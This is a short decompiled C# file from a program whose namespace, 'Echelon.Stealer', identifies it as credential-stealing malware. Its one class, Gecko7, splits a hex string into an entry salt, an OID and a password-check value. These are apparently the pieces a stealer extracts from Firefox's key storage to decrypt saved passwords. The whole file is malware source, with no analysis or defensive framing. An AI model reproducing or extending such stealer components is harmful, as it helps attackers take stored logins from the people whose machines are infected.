using System;
using System.Globalization;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x02000046 RID: 70
	public class Gecko7
	{
		// Token: 0x060001C7 RID: 455 RVA: 0x00020A0C File Offset: 0x0001EC0C
		public Gecko7(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x060001C8 RID: 456 RVA: 0x000098DC File Offset: 0x00007ADC
		public string EntrySalt { get; }

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x060001C9 RID: 457 RVA: 0x000098E4 File Offset: 0x00007AE4
		public string OID { get; }

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x060001CA RID: 458 RVA: 0x000098EC File Offset: 0x00007AEC
		public string Passwordcheck { get; }
	}
}
